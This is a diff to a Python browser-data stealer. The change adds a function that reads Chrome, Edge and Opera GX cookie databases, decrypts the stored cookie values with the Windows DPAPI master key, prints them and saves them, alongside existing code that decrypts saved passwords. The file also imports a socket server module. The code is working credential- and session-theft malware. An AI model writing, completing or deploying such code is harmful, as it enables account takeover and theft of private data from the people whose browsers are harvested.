@@ -1,6 +1,6 @@
 import sqlite3
-import os
 import json
+import csv
 import base64
 import win32crypt
 import Sockets.sckt_server as server
@@ -22,7 +22,7 @@ PATH = {
     "CHROME_BOOKMARKS_FILE_PATH": BasePath + "Chrome_Bookmarks",
     "EDGE_LOCAL_STATE_FILE_PATH": BasePath + "Edge_Local_State",
     "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
-    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
+    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_Cookies",
     "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
     "EDGE_HISTORY_DB_PATH": BasePath + "Edge_History",
     "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
@@ -36,7 +36,7 @@ SQL = {
     "LOGIN_DATA_SQL": "SELECT action_url, username_value, password_value FROM logins",
     "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
     "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
-    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
+    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;",
 }
 
 def get_db_data(file,command,master_key=None):
@@ -120,6 +120,8 @@ def get_pass(nav):
                 print(i[0],i[1],decrypted_password)
                 cursor1.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (i[0], i[1], decrypted_password))
                 cnn1.commit()
+    except:
+        pass
     finally:
         cursor.close()
         cnn.close()
@@ -146,7 +148,34 @@ def get_historial(nav):
         pass
 
 def get_cookies(nav):
-    pass
+    global cnn
+    global cnn1
+
+    if nav == "Chrome":
+        cnn = sqlite3.connect(PATH["CHROME_COOKIES_DB_PATH"])
+        cnn1 = sqlite3.connect("chrome_cookies_decrypted.db")
+    elif nav == "Opera":
+        cnn = sqlite3.connect(PATH["OPERAGX_COOKIES_DB_PATH"])
+        cnn1 = sqlite3.connect("opera_cookies_decrypted.db")
+    elif nav == "Edge":
+        cnn = sqlite3.connect(PATH["EDGE_COOKIES_DB_PATH"])
+        cnn1 = sqlite3.connect("edge_cookies_decrypted.db")
+
+    cursor = cnn.cursor()
+    cursor1 = cnn1.cursor()
+
+    cursor.execute(SQL["COOKIES_SQL"])
+    cursor1.execute('''CREATE TABLE cookies(host_key, name, encrypted_value, path, is_httponly, creation_utc, expires_utc, last_access_utc)''')
+    try:
+        for i in cursor.fetchall():
+            decrypted_cookies = decrypt_pass(i[2], master_Key(nav))
+            if decrypted_cookies:
+                print(i[0], i[1], decrypted_cookies, i[3], [4], i[5], i[6], i[7])
+                cursor1.execute("INSERT INTO cookies (host_key, name, value, path, is_httponly, creation_utc, expires_utc, last_access_utc) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",(i[0], i[1], decrypted_cookies, i[3], i[4], i[5], i[6], i[7]))
+                cnn1.commit()
+    finally:
+        cursor.close()
+        cnn.close()
 
 def get_bookmarks(nav):
     pass
@@ -210,7 +239,7 @@ def main():
                 y = int(input())
                 if y == 1:
                     # Chrome
-                    options[x]("chrome")
+                    options[x]("Chrome")
                 elif y == 2:
                     #Edge
                     options[x]("Edge")
@@ -225,7 +254,7 @@ def main():
                 y = int(input())
                 if y == 1:
                     # Chrome
-                    options[x]("chrome")
+                    options[x]("Chrome")
                 elif y == 2:
                     #Edge
                     options[x]("Edge")
